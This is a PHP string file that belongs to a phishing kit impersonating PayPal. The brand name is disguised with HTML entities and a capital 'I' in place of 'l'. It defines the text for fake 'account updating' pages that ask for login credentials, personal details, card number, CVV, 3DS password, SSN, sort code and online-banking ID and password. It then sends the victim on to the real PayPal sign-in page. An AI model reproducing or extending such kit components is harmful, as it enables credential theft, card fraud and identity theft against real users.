<?php 
//LOG
$log_ttl1="&#80;&#97;y&#80;&#97;I Account Updating";
$log_ttl2="Secure";
$log_lab1="&#80;&#97;y&#80;&#97;I Page Secure";
$log_lab2="Login to your account";
$log_em="Your Email";
$log_ps="Your Password";
$log_frg="Forgot your email or password ?";
$log_btn="Log In";
//FTR
$ftr_01="Privacy";
$ftr_02="Legal";
$ftr_03="Contact";
$ftr_04="Feedback";
//INF
$inf_scr="Your security is our top priority";
$inf_ttspan="Account Information Updating";
$inf_lab1="Update Your Billing Address";
$inf_corr="Please enter your billing address correctly.";
$inf_frnm="Legal first name";
$inf_lsnm="Legal last name";
$inf_dob="Date Of Birthday DD/MM/YYYY";
$inf_add="Street address";
$inf_cty="Town/City";
$inf_stt="State";
$inf_cnt="Country";
$inf_zip="ZIP Code";
$inf_mob="Mobile";
$inf_hom="Home";
$inf_pho="Phone number";
$inf_con="Continue";
//CRD
$crd_ttspan="Card information updating";
$crd_lab1="Update Your Credit/Debit Card";
$crd_corr="Please enter your credit/debit card information correctly";
$crd_crdh="Card holder";
$crd_crdn="Card number";
$crd_expd="Expiration date MM/YY";
$crd_cv="CVV/CSC";
$crd_ttcv="Enter your verification code card showen on your card";
$crd_ptcv="./scr/csc";
$crd_wtcv="What is the CSC code ?";
$crd_ttptcv="Card Verification Code - Help";
$crd_cvp="CVV (or card verification value) is an anti-fraud security feature that checks if the credit card is in your possession. For Visa / Mastercard, the CVV three digit number printed on the signature panel on the back of the card after the account number. For American Express, the four-digit CVV number is printed on the front of the card above the account number.";
$crd_cvtd1="There is a number of 3 figures in italics inverted the back of the credit card.";
$crd_cvtd2="It's a 4-digit number on the front of the card, just above the credit card number.";
$crd_cvfrm="Close";
$crd_pcptcv="../../imcs_files/cv.png";
$crd_3ds="3DS VBV/MSC Password";
$crd_acc="Account number";
$crd_sn="SSN";
$crd_ttsn="Social Security number";
$crd_srt="Sort code";
$crd_ttptsrt="Sort code - Help";
$crd_ptsrt="./scr/srt/";
$crd_pcsrt="../../imcs_files/srt.png";
$crd_btn="Continue";
//BNK
$bnk_ttspan="Bank information updating";
$bnk_lab1="Update your bank account";
$bnk_yrbn="Your bank name:";
$bnk_corr="Please enter your bank information correctly";
$bnk_id="Bank ID";
$bnk_ps="Bank password";
$bnk_rt="Routing number";
$bnk_bt="Save";
//SCS
$scs_ttspan="Successful updating";
$scs_lnk="https://www.paypal.com/signin/";
$scs_tnk="Thank you";
$scs_yrp="Your PayPaI account has been successfully updated.";
$scs_yhv="You have to re-login to save changes, you will be redirected automatically to login page in 3 seconds ... Thank you for using our system verification..";
?>